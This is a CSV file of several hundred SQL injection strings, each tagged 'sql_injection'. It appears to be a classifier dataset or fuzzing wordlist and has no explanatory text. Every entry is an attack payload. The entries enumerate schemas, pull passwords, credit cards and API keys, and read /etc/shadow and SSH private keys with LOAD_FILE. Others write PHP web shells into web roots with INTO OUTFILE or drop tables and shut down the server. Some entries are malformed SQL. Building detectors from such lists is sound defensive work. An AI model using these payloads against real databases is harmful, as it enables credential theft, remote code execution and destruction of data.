"' OR CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS CHAR) LIKE '%' --","sql_injection"
"' OR CAST((SELECT column_name FROM information_schema.columns LIMIT 1) AS CHAR) LIKE '%' --","sql_injection"
"' OR CONCAT_WS(':',user(),database(),version()) LIKE '%' --","sql_injection"
"' OR CONCAT(user(),database()) LIKE '%' --","sql_injection"
"' OR CONCAT(user(),':',database()) LIKE '%' --","sql_injection"
"' OR CONCAT(database(),',',user()) LIKE '%' --","sql_injection"
"' OR CONCAT(version(),database()) LIKE '%' --","sql_injection"
"' OR CONCAT(version(),user()) LIKE '%' --","sql_injection"
"' OR version() REGEXP '.' --","sql_injection"
"' OR database() REGEXP '.' --","sql_injection"
"' OR user() REGEXP '.' --","sql_injection"
"' OR (SELECT version()) REGEXP '.' --","sql_injection"
"' OR (SELECT database()) REGEXP '.' --","sql_injection"
"' OR (SELECT user()) REGEXP '.' --","sql_injection"
"' OR tablename REGEXP '.*' FROM pg_tables --","sql_injection"
"' OR EXISTS(SELECT * FROM users WHERE username='admin') --","sql_injection"
"' OR EXISTS(SELECT * FROM accounts WHERE balance>0) --","sql_injection"
"' OR EXISTS(SELECT * FROM credit_cards LIMIT 1) --","sql_injection"
"' OR EXISTS(SELECT * FROM logs LIMIT 1) --","sql_injection"
"' OR EXISTS(SELECT * FROM admin LIMIT 1) --","sql_injection"
"' OR 1=1 AND (SELECT COUNT(*) FROM pg_tables)>0 --","sql_injection"
"' OR 1=1 AND (SELECT COUNT(*) FROM sqlite_master)>0 --","sql_injection"
"' UNION SELECT name,NULL FROM sqlite_master WHERE type='table' --","sql_injection"
"' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' --","sql_injection"
"' UNION SELECT type,name FROM sqlite_master --","sql_injection"
"' OR COALESCE((SELECT name FROM sqlite_master LIMIT 1),'x') LIKE '%' --","sql_injection"
"' OR LENGTH((SELECT sql FROM sqlite_master LIMIT 1))>0 --","sql_injection"
"' OR (SELECT quote(version())) LIKE '%' --","sql_injection"
"' OR (SELECT group_concat(name) FROM sqlite_master WHERE type='table') LIKE '%' --","sql_injection"
"' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0 --","sql_injection"
"' OR EXISTS(SELECT sql FROM sqlite_master WHERE sql LIKE '%CREATE%') --","sql_injection"
"' OR 1=1 AND typeof((SELECT name FROM sqlite_master LIMIT 1))='text' --","sql_injection"
"' OR randomblob(16) IS NOT NULL --","sql_injection"
"' OR hex(randomblob(8)) LIKE '%' --","sql_injection"
"' OR lower((SELECT name FROM sqlite_master LIMIT 1)) LIKE '%' --","sql_injection"
"' OR instr((SELECT sql FROM sqlite_master LIMIT 1),'CREATE')>0 --","sql_injection"
"' OR (SELECT sqlite_version()) LIKE '3.%' --","sql_injection"
"' OR length((SELECT sqlite_version()))>0 --","sql_injection"
"' UNION SELECT sqlite_version(),NULL --","sql_injection"
"' OR (SELECT sql FROM sqlite_master WHERE name='users') LIKE '%' --","sql_injection"
"' OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE '%user%') --","sql_injection"
"' OR 1=1 AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%')>0 --","sql_injection"
"' OR hex((SELECT name FROM sqlite_master LIMIT 1)) LIKE '%' --","sql_injection"
"' OR (SELECT quote(name) FROM sqlite_master LIMIT 1) LIKE '%' --","sql_injection"
"' OR (SELECT COUNT(*) FROM sqlite_master)>0 --","sql_injection"
"' OR (SELECT LENGTH(group_concat(name)) FROM sqlite_master)>0 --","sql_injection"
"' OR EXISTS(SELECT name FROM sqlite_master WHERE sql LIKE '%table%') --","sql_injection"
"' OR 1=1 LIMIT 0,1 --","sql_injection"
"' OR 1=1 LIMIT 1 OFFSET 1 --","sql_injection"
"' OR 1=1 LIMIT 9999 --","sql_injection"
"' OR 1=1 ORDER BY 1 --","sql_injection"
"' OR 1=1 ORDER BY 2 --","sql_injection"
"' OR 1=1 ORDER BY 3 --","sql_injection"
"' OR 1=1 ORDER BY 10 --","sql_injection"
"' OR 1=1 ORDER BY 100 --","sql_injection"
"' ORDER BY 1--","sql_injection"
"' ORDER BY 2--","sql_injection"
"' ORDER BY 3--","sql_injection"
"' ORDER BY 5--","sql_injection"
"' ORDER BY 10--","sql_injection"
"' ORDER BY 999--","sql_injection"
"' OR 1=1# ORDER BY 1","sql_injection"
"' OR 1=1# ORDER BY 2","sql_injection"
"' OR 1=1# ORDER BY 3","sql_injection"
"' OR 1=1# ORDER BY 4","sql_injection"
"' OR 1=1# ORDER BY 10","sql_injection"
"' OR 1=1 UNION SELECT NULL ORDER BY 1 --","sql_injection"
"' OR 1=1 UNION SELECT NULL ORDER BY 2 --","sql_injection"
"' OR 1=1 UNION SELECT NULL ORDER BY 3 --","sql_injection"
"' OR (SELECT COUNT(*) FROM information_schema.tables ORDER BY table_name LIMIT 1)>0 --","sql_injection"
"' OR (SELECT 1 ORDER BY 1)>0 --","sql_injection"
"' OR TRUE ORDER BY 1 --","sql_injection"
"' OR 1=1 AND 1=1 ORDER BY 1 --","sql_injection"
"' OR 1=1 AND 1=1 ORDER BY 2 --","sql_injection"
"' OR 1=1 AND 1=1 ORDER BY 3 --","sql_injection"
"' OR (SELECT LENGTH(table_name) FROM information_schema.tables ORDER BY table_name LIMIT 1)>0 --","sql_injection"
"' OR (SELECT LENGTH(column_name) FROM information_schema.columns ORDER BY column_name LIMIT 1)>0 --","sql_injection"
"' UNION SELECT NULL,NULL,NULL ORDER BY 1 --","sql_injection"
"' UNION SELECT NULL,NULL,NULL ORDER BY 2 --","sql_injection"
"' UNION SELECT NULL,NULL,NULL ORDER BY 3 --","sql_injection"
"' AND (SELECT LENGTH(version()) ORDER BY version() LIMIT 1)>0 --","sql_injection"
"' OR 1=1 AND (SELECT LENGTH(database()) ORDER BY database() LIMIT 1)>0 --","sql_injection"
"' OR 1=1 LOAD_FILE('/etc/passwd') --","sql_injection"
"' OR LOAD_FILE('/etc/shadow') IS NOT NULL --","sql_injection"
"' OR LOAD_FILE('/proc/version') LIKE '%' --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/hosts'),NULL,NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('C:\\boot.ini'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/proc/self/environ'),NULL --","sql_injection"
"' OR (SELECT LOAD_FILE('/etc/passwd')) LIKE '%' --","sql_injection"
"' AND LOAD_FILE('/etc/passwd') IS NOT NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/shadow') --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/hostname') --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/group') --","sql_injection"
"' OR (SELECT hex(LOAD_FILE('/etc/passwd'))) LIKE '%' --","sql_injection"
"' OR LOAD_FILE('/var/log/auth.log') LIKE '%' --","sql_injection"
"' OR (SELECT LENGTH(LOAD_FILE('/etc/passwd')))>0 --","sql_injection"
"' OR (SELECT LENGTH(LOAD_FILE('/etc/shadow'))) > 0 --","sql_injection"
"' OR (SELECT LENGTH(LOAD_FILE('/etc/hosts'))) > 0 --","sql_injection"
"' UNION SELECT LOAD_FILE('/root/.ssh/id_rsa') --","sql_injection"
"' UNION SELECT LOAD_FILE('/home/admin/.bash_history') --","sql_injection"
"' OR LOAD_FILE('/root/.ssh/id_rsa') IS NOT NULL --","sql_injection"
"' UNION SELECT 1,LOAD_FILE('/etc/ssh/sshd_config') --","sql_injection"
"' UNION SELECT 1,LOAD_FILE('/etc/sudoers') --","sql_injection"
"' OR (SELECT LOAD_FILE('/etc/sudoers')) LIKE '%' --","sql_injection"
"' OR hex(LOAD_FILE('/etc/sudoers')) LIKE '%' --","sql_injection"
"' UNION SELECT NULL,hex(LOAD_FILE('/etc/shadow')) --","sql_injection"
"' OR (SELECT LENGTH(LOAD_FILE('/var/log/syslog'))) > 0 --","sql_injection"
"' OR (SELECT LENGTH(LOAD_FILE('/var/log/messages'))) > 0 --","sql_injection"
"' AND (SELECT LENGTH(LOAD_FILE('/etc/hostname'))) > 0 --","sql_injection"
"' OR 1=1 UNION SELECT load_file('/etc/passwd') --","sql_injection"
"' OR 1=1 UNION SELECT load_file('/etc/shadow') --","sql_injection"
"' OR 1=1 UNION SELECT load_file('/etc/group') --","sql_injection"
"' OR 1=1 UNION SELECT load_file('/etc/ssh/ssh_config') --","sql_injection"
"' OR 1=1 UNION SELECT load_file('/etc/fstab') --","sql_injection"
"' OR 1=1; SELECT load_file('/etc/passwd') --","sql_injection"
"' OR 1=1; SELECT load_file('/etc/shadow') --","sql_injection"
"' OR 1=1; SELECT hex(load_file('/etc/passwd')) --","sql_injection"
"' OR 1=1; SELECT hex(load_file('/etc/shadow')) --","sql_injection"
"' OR 1=1; SELECT length(load_file('/etc/passwd')) --","sql_injection"
"' OR 1=1; SELECT length(load_file('/etc/shadow')) --","sql_injection"
"' OR (SELECT hex(load_file('/etc/passwd'))) LIKE '%' --","sql_injection"
"' OR (SELECT hex(load_file('/etc/shadow'))) LIKE '%' --","sql_injection"
"' OR 1=1; SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) --","sql_injection"
"' UNION SELECT NULL,OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) --","sql_injection"
"' OR (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL --","sql_injection"
"' OR (SELECT LOAD_FILE('/etc/shadow')) IS NOT NULL --","sql_injection"
"' UNION SELECT NULL,LOAD_FILE('/var/log/dmesg') --","sql_injection"
"' OR LOAD_FILE('/proc/mounts') IS NOT NULL --","sql_injection"
"' OR hex(LOAD_FILE('/proc/mounts')) LIKE '%' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/pwned.txt' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/var/www/html/shell.php' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x.txt' --","sql_injection"
"' INTO OUTFILE '/tmp/shell.php' --","sql_injection"
"' INTO DUMPFILE '/tmp/raw.bin' --","sql_injection"
"' OR NULL INTO OUTFILE '/var/www/html/test.txt' --","sql_injection"
"' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/s.php' --","sql_injection"
"' OR 1=1; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/rce.php' --","sql_injection"
"' OR (SELECT '<?php echo shell_exec($_GET[x]); ?>') INTO OUTFILE '/var/www/html/x.php' --","sql_injection"
"' OR 1=1; SELECT '<?php echo `whoami`; ?>' INTO OUTFILE '/var/www/html/cmd.php' --","sql_injection"
"' INTO OUTFILE '/var/www/html/payload.php' --","sql_injection"
"' OR (SELECT '<?php phpinfo(); ?>') INTO OUTFILE '/tmp/info.php' --","sql_injection"
"' UNION SELECT '<?php echo \"OWNED\"; ?>' INTO OUTFILE '/var/www/html/o.php' --","sql_injection"
"' OR length('<?php echo 1; ?>') INTO OUTFILE '/tmp/test.php' --","sql_injection"
"' INJECT INTO OUTFILE '/tmp/a.txt' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/var/tmp/output.txt' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/opt/pwned.txt' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/srv/www/shell.php' --","sql_injection"
"' OR 1=1 INTO OUTFILE '/usr/share/nginx/html/cmd.php' --","sql_injection"
"' INTO OUTFILE '/tmp/db-dump.txt' --","sql_injection"
"' INTO OUTFILE '/tmp/logging.txt' --","sql_injection"
"' INTO OUTFILE '/tmp/hacked.txt' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/tmp/test.bin' --","sql_injection"
"' OR SLEEP(1) INTO OUTFILE '/tmp/x' --","sql_injection"
"' OR BENCHMARK(10000,MD5(1)) INTO OUTFILE '/tmp/y' --","sql_injection"
"' OR 1=1 RETURNING * --","sql_injection"
"' OR 1=1 RETURNING username,password --","sql_injection"
"' OR TRUE RETURNING * --","sql_injection"
"' OR EXISTS(SELECT 1) RETURNING * --","sql_injection"
"' OR (SELECT 1)=(SELECT 1) RETURNING * --","sql_injection"
"' RETURNING load_file('/etc/passwd') --","sql_injection"
"' RETURNING version() --","sql_injection"
"' RETURNING current_database() --","sql_injection"
"' OR 1=1 RETURNING table_name FROM information_schema.tables --","sql_injection"
"' OR 1=1 RETURNING sql FROM sqlite_master --","sql_injection"
"' OR user() LIKE '%' RETURNING * --","sql_injection"
"' OR version() LIKE '%' RETURNING * --","sql_injection"
"' OR (SELECT COUNT(*) FROM users)>0 RETURNING * --","sql_injection"
"' OR LENGTH((SELECT database()))>0 RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM users WHERE username='admin') RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM mysql.user) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM pg_user) RETURNING * --","sql_injection"
"' OR (SELECT sqlite_version()) LIKE '%' RETURNING * --","sql_injection"
"' OR 'a'='a RETURNING * --","sql_injection"
"' OR TRUE RETURNING id --","sql_injection"
"' OR TRUE RETURNING username,password --","sql_injection"
"' OR TRUE RETURNING credit_card,cvv --","sql_injection"
"' OR TRUE RETURNING admin_token --","sql_injection"
"' OR TRUE RETURNING secret_key --","sql_injection"
"' RETURNING (SELECT version()) --","sql_injection"
"' RETURNING (SELECT database()) --","sql_injection"
"' RETURNING (SELECT user()) --","sql_injection"
"' RETURNING (SELECT group_concat(schema_name) FROM information_schema.schemata) --","sql_injection"
"' RETURNING (SELECT group_concat(table_name) FROM information_schema.tables) --","sql_injection"
"' RETURNING (SELECT group_concat(column_name) FROM information_schema.columns) --","sql_injection"
"' OR 1=1 RETURNING (SELECT version()) --","sql_injection"
"' OR 1=1 RETURNING (SELECT database()) --","sql_injection"
"' OR 1=1 RETURNING (SELECT user()) --","sql_injection"
"' OR 1=1 RETURNING (SELECT current_database()) --","sql_injection"
"' OR 1=1 RETURNING (SELECT current_user) --","sql_injection"
"' OR 1=1 RETURNING (SELECT hex(user())) --","sql_injection"
"' OR (SELECT LENGTH(user()))>0 RETURNING * --","sql_injection"
"' OR (SELECT LENGTH(database()))>0 RETURNING * --","sql_injection"
"' OR (SELECT LENGTH(version()))>0 RETURNING * --","sql_injection"
"' OR (SELECT LENGTH(group_concat(table_name)))>0 RETURNING * --","sql_injection"
"' OR user() LIKE '%'-- RETURNING *","sql_injection"
"' OR database() LIKE '%'-- RETURNING *","sql_injection"
"' OR version() LIKE '%'-- RETURNING *","sql_injection"
"' OR current_database() LIKE '%'-- RETURNING *","sql_injection"
"' OR current_user LIKE '%'-- RETURNING *","sql_injection"
"' OR EXISTS(SELECT NULL) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM sqlite_master) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM information_schema.tables) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM mysql.user) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM pg_tables) RETURNING * --","sql_injection"
"' OR EXISTS(SELECT * FROM users WHERE username LIKE '%') RETURNING * --","sql_injection"
"' AND EXISTS(SELECT 1) RETURNING * --","sql_injection"
"' AND EXISTS(SELECT COUNT(*) FROM users) RETURNING * --","sql_injection"
"' OR 1=1 RETURNING row_to_json(pg_catalog.pg_user) --","sql_injection"
"' OR 1=1 RETURNING row_to_json(pg_roles) --","sql_injection"
"' OR 1=1 RETURNING json_agg(usename) FROM pg_user --","sql_injection"
"' OR 1=1 RETURNING json_agg(tablename) FROM pg_tables --","sql_injection"
"' RETURNING json_agg(sql) FROM sqlite_master --","sql_injection"
"' RETURNING json_agg(name) FROM sqlite_master --","sql_injection"
"' RETURNING load_file('/etc/ssh/sshd_config') --","sql_injection"
"' RETURNING load_file('/etc/sudoers') --","sql_injection"
"' RETURNING load_file('/proc/mounts') --","sql_injection"
"' RETURNING load_file('/proc/cpuinfo') --","sql_injection"
"' RETURNING load_file('/proc/version') --","sql_injection"
"' OR 1=1-- RETURNING hex(load_file('/etc/passwd'))","sql_injection"
"' OR 1=1-- RETURNING hex(load_file('/etc/shadow'))","sql_injection"
"' RETURNING hex(load_file('/etc/group')) --","sql_injection"
"' RETURNING hex(load_file('/etc/hostname')) --","sql_injection"
"' RETURNING hex(load_file('/var/log/syslog')) --","sql_injection"
"' RETURNING '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/payload.php' --","sql_injection"
"' RETURNING '<?php echo shell_exec($_GET[x]); ?>' INTO OUTFILE '/var/www/html/x.php' --","sql_injection"
"' RETURNING '<?php phpinfo(); ?>' INTO OUTFILE '/tmp/info.php' --","sql_injection"
"' RETURNING '<?php echo `whoami`; ?>' INTO OUTFILE '/var/www/html/who.php' --","sql_injection"
"' INTO OUTFILE '/tmp/evil.php' RETURNING * --","sql_injection"
"' INTO OUTFILE '/tmp/shell.phtml' RETURNING * --","sql_injection"
"' INTO OUTFILE '/var/www/html/cmd.phtml' RETURNING * --","sql_injection"
"' INTO OUTFILE '/var/www/html/door.php' RETURNING * --","sql_injection"
"' INTO OUTFILE '/usr/share/nginx/html/rce.php' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x1.txt' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x2.txt' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x3.txt' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x4.txt' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/x5.txt' RETURNING * --","sql_injection"
"' OR 1=1 INTO OUTFILE '/tmp/z.txt' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/tmp/dbdump1.bin' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/tmp/dbdump2.bin' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/tmp/dbdump3.bin' --","sql_injection"
"' INTO DUMPFILE '/tmp/payload1.bin' --","sql_injection"
"' INTO DUMPFILE '/tmp/payload2.bin' --","sql_injection"
"' INTO DUMPFILE '/tmp/payload3.bin' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/var/lib/mysql/x1.bin' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/var/lib/mysql/x2.bin' --","sql_injection"
"' OR 1=1 INTO DUMPFILE '/var/lib/mysql/x3.bin' --","sql_injection"
"' OR TRUE INTO DUMPFILE '/tmp/any.bin' --","sql_injection"
"' OR TRUE INTO DUMPFILE '/tmp/abc.bin' --","sql_injection"
"' OR TRUE INTO DUMPFILE '/tmp/dump.bin' --","sql_injection"
"' OR TRUE; SELECT @@version --","sql_injection"
"' OR TRUE; SELECT database() --","sql_injection"
"' OR TRUE; SELECT user() --","sql_injection"
"' OR TRUE; SELECT table_name FROM information_schema.tables --","sql_injection"
"' OR TRUE; SELECT column_name FROM information_schema.columns --","sql_injection"
"' OR TRUE; SELECT sql FROM sqlite_master LIMIT 1 --","sql_injection"
"' OR TRUE; SELECT usename FROM pg_user LIMIT 1 --","sql_injection"
"' OR TRUE; SELECT version() FROM pg_catalog.pg_settings LIMIT 1 --","sql_injection"
"' OR TRUE; SELECT load_file('/etc/passwd') --","sql_injection"
"' OR TRUE; SELECT load_file('/etc/shadow') --","sql_injection"
"' OR TRUE; SELECT load_file('/var/log/syslog') --","sql_injection"
"' OR TRUE; SELECT load_file('/proc/cpuinfo') --","sql_injection"
"' UNION ALL SELECT 1,'admin','pass' --","sql_injection"
"' UNION ALL SELECT 1,'root','root' --","sql_injection"
"' UNION ALL SELECT 1,'guest','guest123' --","sql_injection"
"' UNION ALL SELECT 1,'test','test123' --","sql_injection"
"' UNION ALL SELECT username,password FROM users --","sql_injection"
"' UNION ALL SELECT card_number,cvv FROM credit_cards --","sql_injection"
"' UNION ALL SELECT email,password FROM accounts --","sql_injection"
"' UNION ALL SELECT token,secret FROM api_keys --","sql_injection"
"' UNION ALL SELECT hex(user()),hex(database()) --","sql_injection"
"' UNION ALL SELECT table_schema,table_name FROM information_schema.tables --","sql_injection"
"' UNION ALL SELECT column_name,data_type FROM information_schema.columns --","sql_injection"
"' OR TRUE UNION ALL SELECT version() --","sql_injection"
"' OR TRUE UNION ALL SELECT database() --","sql_injection"
"' OR TRUE UNION ALL SELECT user() --","sql_injection"
"' OR TRUE UNION ALL SELECT null,@@version --","sql_injection"
"' OR TRUE UNION ALL SELECT null,@@hostname --","sql_injection"
"' OR TRUE UNION ALL SELECT null,@@datadir --","sql_injection"
"' UNION ALL SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/sh1.php' --","sql_injection"
"' UNION ALL SELECT '<?php echo `whoami`; ?>' INTO OUTFILE '/var/www/html/sh2.php' --","sql_injection"
"' UNION ALL SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/tmp/info2.php' --","sql_injection"
"' OR 'x'='x'; DROP TABLE users --","sql_injection"
"' OR '1'='1'; DROP TABLE accounts --","sql_injection"
"' OR TRUE; DELETE FROM logs --","sql_injection"
"' OR TRUE; UPDATE users SET admin=1 WHERE username='guest' --","sql_injection"
"' OR TRUE; INSERT INTO admin(username,password) VALUES('hax','123') --","sql_injection"
"' OR TRUE; TRUNCATE TABLE sessions --","sql_injection"
"' OR TRUE; SHUTDOWN --","sql_injection"
"' OR TRUE; KILL QUERY 3 --","sql_injection"
"' OR TRUE; KILL CONNECTION 5 --","sql_injection"
"' OR TRUE; RELOAD --","sql_injection"
"' OR TRUE; FLUSH PRIVILEGES --","sql_injection"
"' OR TRUE; FLUSH HOSTS --","sql_injection"
"' OR TRUE; FLUSH TABLES --","sql_injection"
"' OR TRUE; RESET QUERY CACHE --","sql_injection"
"' OR TRUE; RESET MASTER --","sql_injection"
"' OR TRUE; SET GLOBAL general_log=1 --","sql_injection"
"' OR TRUE; SET GLOBAL slow_query_log=1 --","sql_injection"
"' OR TRUE; SET GLOBAL event_scheduler=ON --","sql_injection"
"' OR TRUE; SET GLOBAL innodb_force_recovery=6 --","sql_injection"
"' OR TRUE; SET GLOBAL sql_mode='' --","sql_injection"
"' OR TRUE; SET GLOBAL max_connections=100000 --","sql_injection"

